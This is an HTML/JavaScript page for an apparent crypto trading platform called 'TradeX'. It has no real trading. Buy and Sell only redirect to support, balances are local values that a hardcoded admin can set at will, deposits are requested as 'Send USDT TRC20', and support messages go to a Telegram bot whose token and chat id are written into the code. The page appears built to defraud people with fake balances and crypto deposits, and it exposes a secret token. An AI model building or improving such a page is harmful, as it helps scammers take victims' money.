<!DOCTYPE html><html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>TradeX Final</title>
<style>
body{margin:0;font-family:Arial;background:#000;color:#fff}
.header{background:#ff9800;padding:15px;text-align:center}
.card{background:#111;margin:10px;padding:15px;border-radius:10px}
input,button{width:100%;padding:10px;margin-top:10px;border:none;border-radius:6px}
button{background:#ff9800;color:#fff}
.nav{position:fixed;bottom:0;width:100%;display:flex;background:#111}
.nav button{flex:1;background:#222}
.chat{height:200px;overflow:auto;background:#000;padding:10px;border-radius:8px}
</style>
</head>
<body><div class="header">🔥 TradeX</div><div id="auth" class="card">
<h3>Login</h3>
<input id="email" placeholder="Email">
<input id="pass" placeholder="Password">
<button onclick="login()">Login</button>
</div><div id="dashboard" style="display:none"><div class="card">
<h3>Welcome <span id="user"></span></h3>
<p>Balance: $<span id="bal">0</span></p>
<button onclick="openDeposit()">Add Funds</button>
</div><div class="card">
<h3>Trade</h3>
<input placeholder="Amount">
<button onclick="goSupport()">Buy</button>
<button onclick="goSupport()">Sell</button>
</div><div class="card">
<h3>Market</h3>
<iframe id="chart" width="100%" height="300"></iframe>
</div><div id="supportPage" class="card" style="display:none">
<h3>Customer Support</h3>
<div id="chatBox" class="chat">
<p><b>Support:</b> Hello 👋</p>
</div>
<input id="msg" placeholder="Type message">
<button onclick="sendMsg()">Send</button>
</div><div id="adminPanel" class="card" style="display:none">
<h3>Admin Panel</h3>
<input id="targetEmail" placeholder="User Email">
<input id="amount" placeholder="+ / - amount">
<button onclick="updateBalance()">Update Balance</button>
</div><button onclick="logout()">Logout</button>

</div><div class="nav">
<button onclick="showHome()">Home</button>
<button onclick="showMarket()">Market</button>
<button onclick="showSupport()">Support</button>
</div><script>

const ADMIN="admin@tradex.com";

// LOGIN
function login(){
let e=email.value;
let saved=localStorage.getItem("user_"+e);
let data;

if(saved){data=JSON.parse(saved);}else{
data={email:e,user:e,balance:0};}

localStorage.setItem("currentUser",e);
localStorage.setItem("user_"+e,JSON.stringify(data));
loadUser();
}

// LOAD USER
function loadUser(){
let e=localStorage.getItem("currentUser");
if(!e)return;

let data=JSON.parse(localStorage.getItem("user_"+e));

auth.style.display="none";
dashboard.style.display="block";

user.innerText=data.user;
bal.innerText=data.balance;

if(e===ADMIN){adminPanel.style.display="block";}
}

// AUTO LOGIN
window.onload=function(){
loadUser();
chart.src="https://s.tradingview.com/widgetembed/?symbol=BINANCE:BTCUSDT";
}

// LOGOUT
function logout(){
localStorage.removeItem("currentUser");
location.reload();
}

// ADMIN UPDATE
function updateBalance(){
let admin=localStorage.getItem("currentUser");
if(admin!==ADMIN){alert("Only admin");return;}

let target=targetEmail.value;
let amt=parseInt(amount.value);

let saved=localStorage.getItem("user_"+target);
if(!saved){alert("User not found");return;}

let data=JSON.parse(saved);
data.balance+=amt;

localStorage.setItem("user_"+target,JSON.stringify(data));

if(localStorage.getItem("currentUser")===target){
bal.innerText=data.balance;
}

alert("Updated ✅");
}

// SUPPORT REDIRECT
function goSupport(){
showSupport();
alert("Contact support");
}

// SEND MESSAGE
function sendMsg(){
let m=msg.value;
if(!m)return;
chatBox.innerHTML+=`<p><b>You:</b> ${m}</p>`;

fetch("https://api.telegram.org/8783222629:AAFKMf4bAd1mbg3P7A02C5OK1oHIBJh2dH4",{
method:"POST",
headers:{"Content-Type":"application/json"},
body:JSON.stringify({chat_id:"2025370144",text:m})
});

msg.value="";
}

// NAV
function showHome(){supportPage.style.display="none"}
function showMarket(){supportPage.style.display="none"}
function showSupport(){supportPage.style.display="block"}

// DEPOSIT
function openDeposit(){alert("Send USDT TRC20")}

</script></body>
</html>
